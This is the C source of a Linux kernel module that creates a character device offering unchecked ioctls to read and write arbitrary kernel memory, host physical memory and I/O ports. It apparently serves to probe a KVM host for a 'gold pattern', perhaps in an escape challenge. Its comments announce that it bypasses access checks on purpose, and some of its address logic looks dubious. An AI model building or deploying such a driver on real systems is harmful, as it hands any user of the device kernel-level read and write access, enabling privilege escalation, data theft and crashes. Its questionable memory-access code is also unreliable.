#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/fs.h>
#include <linux/cdev.h>
#include <linux/device.h>
#include <linux/uaccess.h>
#include <linux/io.h>
#include <linux/mm.h>
#include <linux/slab.h>
#include <linux/kvm_host.h>
#include <linux/kvm.h>
#include <linux/vmalloc.h>
#include <linux/io.h>
#include <linux/highmem.h>

#define DEVICE_NAME "kvm_probe_dev"
#define CLASS_NAME "kvm_probe"

/* IOCTL Commands */
#define IOCTL_READ_PORT        0x1001
#define IOCTL_WRITE_PORT       0x1002
#define IOCTL_READ_HOST_MEM    0x1016
#define IOCTL_WRITE_HOST_MEM   0x1017
#define IOCTL_READ_HOST_PHYS   0x1018
#define IOCTL_WRITE_HOST_PHYS  0x1019

/* Gold pattern for detection */
#define GOLD_PATTERN 0xefbeadde44434241ULL

/* Structures matching userspace */
struct host_mem_access {
    unsigned long host_addr;
    unsigned long length;
    unsigned char __user *user_buffer;
};

struct host_phys_access {
    unsigned long host_phys_addr;
    unsigned long length;
    unsigned char __user *user_buffer;
};

struct port_io_data {
    unsigned short port;
    unsigned int size;
    unsigned int value;
};

static int major_number;
static struct class *kvm_probe_class = NULL;
static struct device *kvm_probe_device = NULL;
static struct cdev kvm_probe_cdev;

/* ========================================================================
 * MOST AGGRESSIVE MEMORY ACCESS FUNCTIONS
 * ======================================================================== */

/* Helper to check if address is kernel address */
static bool is_kernel_addr(unsigned long addr) {
#ifdef CONFIG_X86_64
    return (addr >= 0xffff800000000000UL);
#else
    return (addr >= PAGE_OFFSET);
#endif
}

/* Ultra-aggressive read from ANY memory - tries multiple methods */
static int read_host_memory(unsigned long host_addr, unsigned char *buffer, size_t length) {
    int ret = -EFAULT;

    /* METHOD 1: Direct kernel memory access (no checks) */
    if (is_kernel_addr(host_addr)) {
        memcpy(buffer, (void *)host_addr, length);
        return 0;
    }

    /* METHOD 2: Force user space access (bypass checks) */
    if (length > 0) {
        unsigned long user_addr = host_addr;

        /* Try __copy_from_user without access_ok check */
        if (__copy_from_user(buffer, (void __user *)user_addr, length) == 0) {
            return 0;
        }

        /* Try with page faults disabled */
        pagefault_disable();
        if (__copy_from_user_inatomic(buffer, (void __user *)user_addr, length) == 0) {
            pagefault_enable();
            return 0;
        }
        pagefault_enable();
    }

    /* METHOD 3: Physical memory mapping attempt */
    /* Try to interpret the address as physical and map it */
    if (length > 0 && length <= PAGE_SIZE) {
        void *vaddr = ioremap(host_addr & PAGE_MASK, PAGE_SIZE);
        if (vaddr) {
            memcpy(buffer, vaddr + (host_addr & ~PAGE_MASK), length);
            iounmap(vaddr);
            return 0;
        }
    }

    return -EFAULT;
}

/* Ultra-aggressive write to ANY memory */
static int write_host_memory(unsigned long host_addr, unsigned char *buffer, size_t length) {
    int ret = -EFAULT;

    /* METHOD 1: Direct kernel memory access */
    if (is_kernel_addr(host_addr)) {
        memcpy((void *)host_addr, buffer, length);
        return 0;
    }

    /* METHOD 2: Force user space access */
    if (length > 0) {
        unsigned long user_addr = host_addr;

        if (__copy_to_user((void __user *)user_addr, buffer, length) == 0) {
            return 0;
        }

        pagefault_disable();
        if (__copy_to_user_inatomic((void __user *)user_addr, buffer, length) == 0) {
            pagefault_enable();
            return 0;
        }
        pagefault_enable();
    }

    /* METHOD 3: Physical memory mapping attempt */
    if (length > 0 && length <= PAGE_SIZE) {
        void *vaddr = ioremap(host_addr & PAGE_MASK, PAGE_SIZE);
        if (vaddr) {
            memcpy(vaddr + (host_addr & ~PAGE_MASK), buffer, length);
            iounmap(vaddr);
            return 0;
        }
    }

    return -EFAULT;
}

/* Most aggressive physical memory read - tries everything */
static int read_host_phys_memory(unsigned long phys_addr, unsigned char *buffer, size_t length) {
    void *vaddr;
    size_t offset = 0;
    unsigned long original_phys = phys_addr;
    size_t original_length = length;

    if (length == 0) return 0;

    /* METHOD 1: Direct ioremap (standard approach) */
    while (length > 0) {
        unsigned long page_base = phys_addr & PAGE_MASK;
        unsigned long page_offset = phys_addr & ~PAGE_MASK;
        size_t chunk_size = min_t(size_t, length, PAGE_SIZE - page_offset);

        vaddr = ioremap(page_base, PAGE_SIZE);
        if (!vaddr) break;

        memcpy(buffer + offset, vaddr + page_offset, chunk_size);
        iounmap(vaddr);

        offset += chunk_size;
        phys_addr += chunk_size;
        length -= chunk_size;
    }

    if (length == 0) return 0;

    /* METHOD 2: Try ioremap_cache (if available) */
    offset = 0;
    phys_addr = original_phys;
    length = original_length;

    while (length > 0) {
        unsigned long page_base = phys_addr & PAGE_MASK;
        unsigned long page_offset = phys_addr & ~PAGE_MASK;
        size_t chunk_size = min_t(size_t, length, PAGE_SIZE - page_offset);

        #ifdef ioremap_cache
        vaddr = ioremap_cache(page_base, PAGE_SIZE);
        #else
        vaddr = ioremap(page_base, PAGE_SIZE);
        #endif

        if (!vaddr) break;

        memcpy(buffer + offset, vaddr + page_offset, chunk_size);
        iounmap(vaddr);

        offset += chunk_size;
        phys_addr += chunk_size;
        length -= chunk_size;
    }

    if (length == 0) return 0;

    /* METHOD 3: Try memremap (modern approach) */
    #ifdef CONFIG_ARCH_HAS_MEMREMAP
    vaddr = memremap(phys_addr, length, MEMREMAP_WB);
    if (vaddr) {
        memcpy(buffer, vaddr, length);
        memunmap(vaddr);
        return 0;
    }
    #endif

    return -EFAULT;
}

/* Most aggressive physical memory write */
static int write_host_phys_memory(unsigned long phys_addr, unsigned char *buffer, size_t length) {
    void *vaddr;
    size_t offset = 0;
    unsigned long original_phys = phys_addr;
    size_t original_length = length;

    if (length == 0) return 0;

    /* METHOD 1: Direct ioremap */
    while (length > 0) {
        unsigned long page_base = phys_addr & PAGE_MASK;
        unsigned long page_offset = phys_addr & ~PAGE_MASK;
        size_t chunk_size = min_t(size_t, length, PAGE_SIZE - page_offset);

        vaddr = ioremap(page_base, PAGE_SIZE);
        if (!vaddr) break;

        memcpy(vaddr + page_offset, buffer + offset, chunk_size);
        iounmap(vaddr);

        offset += chunk_size;
        phys_addr += chunk_size;
        length -= chunk_size;
    }

    if (length == 0) return 0;

    /* METHOD 2: Try memremap */
    #ifdef CONFIG_ARCH_HAS_MEMREMAP
    vaddr = memremap(phys_addr, length, MEMREMAP_WB);
    if (vaddr) {
        memcpy(vaddr, buffer, length);
        memunmap(vaddr);
        return 0;
    }
    #endif

    return -EFAULT;
}

/* KVM-specific memory access - tries to exploit KVM internals */
static int read_kvm_memory(unsigned long guest_addr, unsigned char *buffer, size_t length) {
    /* Try to access guest memory through KVM structures */
    int ret = -EFAULT;

    /* METHOD 1: Try to use current process memory */
    if (current->mm) {
        /* Attempt to access through process memory structures */
        ret = read_host_memory(guest_addr, buffer, length);
        if (ret == 0) return 0;
    }

    /* METHOD 2: Try various guest memory offsets */
    /* Common KVM guest memory mappings */
    unsigned long test_addresses[] = {
        guest_addr,
        guest_addr + 0xffff000000000000UL, /* Common guest offset */
        guest_addr + 0x00007ffffffff000UL, /* User space top */
        guest_addr | 0xffff800000000000UL, /* Kernel direct mapping */
    };

    int i;
    for (i = 0; i < sizeof(test_addresses)/sizeof(test_addresses[0]); i++) {
        ret = read_host_memory(test_addresses[i], buffer, length);
        if (ret == 0) return 0;
    }

    return -EFAULT;
}

/* Check for gold pattern and log to kernel */
static void check_and_log_gold_pattern(unsigned char *data, size_t length, unsigned long base_addr) {
    size_t i;

    for (i = 0; i <= length - sizeof(GOLD_PATTERN); i++) {
        uint64_t *pattern = (uint64_t *)(data + i);
        if (*pattern == GOLD_PATTERN) {
            printk(KERN_INFO "KVM_PROBE_GOLD: Found pattern at 0x%lx (offset 0x%lx)\n",
                   base_addr, base_addr + i);
        }
    }
}

/* ========================================================================
 * Port I/O Functions
 * ======================================================================== */

static int handle_read_port(struct port_io_data __user *user_data) {
    struct port_io_data data;
    unsigned int value = 0;

    if (copy_from_user(&data, user_data, sizeof(data))) {
        return -EFAULT;
    }

    /* Aggressive port I/O - try all sizes */
    switch (data.size) {
        case 1:
            value = inb(data.port);
            break;
        case 2:
            value = inw(data.port);
            break;
        case 4:
            value = inl(data.port);
            break;
        case 8: /* Try 64-bit if supported */
            #ifdef inq
            value = inq(data.port);
            #else
            value = inl(data.port); /* Fallback to 32-bit */
            #endif
            break;
        default:
            /* Try byte access anyway */
            value = inb(data.port);
            break;
    }

    data.value = value;

    if (copy_to_user(user_data, &data, sizeof(data))) {
        return -EFAULT;
    }

    return 0;
}

static int handle_write_port(struct port_io_data __user *user_data) {
    struct port_io_data data;

    if (copy_from_user(&data, user_data, sizeof(data))) {
        return -EFAULT;
    }

    /* Aggressive port I/O */
    switch (data.size) {
        case 1:
            outb(data.value & 0xFF, data.port);
            break;
        case 2:
            outw(data.value & 0xFFFF, data.port);
            break;
        case 4:
            outl(data.value, data.port);
            break;
        case 8:
            #ifdef outq
            outq(data.value, data.port);
            #else
            outl(data.value, data.port); /* Fallback */
            #endif
            break;
        default:
            outb(data.value & 0xFF, data.port);
            break;
    }

    return 0;
}

/* ========================================================================
 * IOCTL Handler with Fallback Strategies
 * ======================================================================== */

static long kvm_probe_ioctl(struct file *file, unsigned int cmd, unsigned long arg) {
    int ret = 0;

    switch (cmd) {
        case IOCTL_READ_PORT: {
            ret = handle_read_port((struct port_io_data __user *)arg);
            break;
        }

        case IOCTL_WRITE_PORT: {
            ret = handle_write_port((struct port_io_data __user *)arg);
            break;
        }

        case IOCTL_READ_HOST_MEM: {
            struct host_mem_access req;
            unsigned char *kernel_buffer;

            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) {
                ret = -EFAULT;
                break;
            }

            if (req.length > 65536 || req.length == 0) {
                ret = -EINVAL;
                break;
            }

            kernel_buffer = kmalloc(req.length, GFP_KERNEL);
            if (!kernel_buffer) {
                ret = -ENOMEM;
                break;
            }

            /* STRATEGY 1: Try direct host memory access */
            ret = read_host_memory(req.host_addr, kernel_buffer, req.length);

            /* STRATEGY 2: If that fails, try KVM-specific access */
            if (ret != 0) {
                ret = read_kvm_memory(req.host_addr, kernel_buffer, req.length);
            }

            if (ret == 0) {
                /* Check for gold pattern */
                check_and_log_gold_pattern(kernel_buffer, req.length, req.host_addr);

                /* Copy to userspace */
                if (copy_to_user(req.user_buffer, kernel_buffer, req.length)) {
                    ret = -EFAULT;
                }
            }

            kfree(kernel_buffer);
            break;
        }

        case IOCTL_WRITE_HOST_MEM: {
            struct host_mem_access req;
            unsigned char *kernel_buffer;

            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) {
                ret = -EFAULT;
                break;
            }

            if (req.length > 65536 || req.length == 0) {
                ret = -EINVAL;
                break;
            }

            kernel_buffer = kmalloc(req.length, GFP_KERNEL);
            if (!kernel_buffer) {
                ret = -ENOMEM;
                break;
            }

            if (copy_from_user(kernel_buffer, req.user_buffer, req.length)) {
                kfree(kernel_buffer);
                ret = -EFAULT;
                break;
            }

            /* Try multiple write strategies */
            ret = write_host_memory(req.host_addr, kernel_buffer, req.length);

            kfree(kernel_buffer);
            break;
        }

        case IOCTL_READ_HOST_PHYS: {
            struct host_phys_access req;
            unsigned char *kernel_buffer;

            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) {
                ret = -EFAULT;
                break;
            }

            if (req.length > 65536 || req.length == 0) {
                ret = -EINVAL;
                break;
            }

            kernel_buffer = kmalloc(req.length, GFP_KERNEL);
            if (!kernel_buffer) {
                ret = -ENOMEM;
                break;
            }

            /* Aggressive physical memory read */
            ret = read_host_phys_memory(req.host_phys_addr, kernel_buffer, req.length);

            if (ret == 0) {
                check_and_log_gold_pattern(kernel_buffer, req.length, req.host_phys_addr);

                if (copy_to_user(req.user_buffer, kernel_buffer, req.length)) {
                    ret = -EFAULT;
                }
            }

            kfree(kernel_buffer);
            break;
        }

        case IOCTL_WRITE_HOST_PHYS: {
            struct host_phys_access req;
            unsigned char *kernel_buffer;

            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) {
                ret = -EFAULT;
                break;
            }

            if (req.length > 65536 || req.length == 0) {
                ret = -EINVAL;
                break;
            }

            kernel_buffer = kmalloc(req.length, GFP_KERNEL);
            if (!kernel_buffer) {
                ret = -ENOMEM;
                break;
            }

            if (copy_from_user(kernel_buffer, req.user_buffer, req.length)) {
                kfree(kernel_buffer);
                ret = -EFAULT;
                break;
            }

            ret = write_host_phys_memory(req.host_phys_addr, kernel_buffer, req.length);

            kfree(kernel_buffer);
            break;
        }

        default:
            ret = -ENOTTY;
            break;
    }

    return ret;
}

/* ========================================================================
 * File Operations
 * ======================================================================== */

static struct file_operations fops = {
    .owner = THIS_MODULE,
    .unlocked_ioctl = kvm_probe_ioctl,
};

/* ========================================================================
 * Module Init/Exit
 * ======================================================================== */

static int __init kvm_probe_init(void) {
    int ret;
    dev_t devno;

    printk(KERN_INFO "KVM Probe Driver: Initializing\n");

    /* Allocate major number */
    ret = alloc_chrdev_region(&devno, 0, 1, DEVICE_NAME);
    if (ret < 0) {
        printk(KERN_ERR "KVM Probe: Failed to allocate device number\n");
        return ret;
    }

    major_number = MAJOR(devno);

    /* Create device class */
    kvm_probe_class = class_create(CLASS_NAME);
    if (IS_ERR(kvm_probe_class)) {
        unregister_chrdev_region(devno, 1);
        printk(KERN_ERR "KVM Probe: Failed to create device class\n");
        return PTR_ERR(kvm_probe_class);
    }

    /* Create character device */
    cdev_init(&kvm_probe_cdev, &fops);
    kvm_probe_cdev.owner = THIS_MODULE;

    ret = cdev_add(&kvm_probe_cdev, devno, 1);
    if (ret < 0) {
        class_destroy(kvm_probe_class);
        unregister_chrdev_region(devno, 1);
        printk(KERN_ERR "KVM Probe: Failed to add character device\n");
        return ret;
    }

    /* Create device node */
    kvm_probe_device = device_create(kvm_probe_class, NULL, devno, NULL, DEVICE_NAME);
    if (IS_ERR(kvm_probe_device)) {
        cdev_del(&kvm_probe_cdev);
        class_destroy(kvm_probe_class);
        unregister_chrdev_region(devno, 1);
        printk(KERN_ERR "KVM Probe: Failed to create device\n");
        return PTR_ERR(kvm_probe_device);
    }

    printk(KERN_INFO "KVM Probe Driver: Loaded successfully (major %d)\n", major_number);
    printk(KERN_INFO "KVM Probe: Using aggressive memory access strategies\n");
    return 0;
}

static void __exit kvm_probe_exit(void) {
    dev_t devno = MKDEV(major_number, 0);

    device_destroy(kvm_probe_class, devno);
    class_unregister(kvm_probe_class);
    class_destroy(kvm_probe_class);
    cdev_del(&kvm_probe_cdev);
    unregister_chrdev_region(devno, 1);

    printk(KERN_INFO "KVM Probe Driver: Unloaded\n");
}

module_init(kvm_probe_init);
module_exit(kvm_probe_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("KVM Prober");
MODULE_DESCRIPTION("Aggressive KVM Memory and Port Probing Driver");
MODULE_VERSION("2.0");
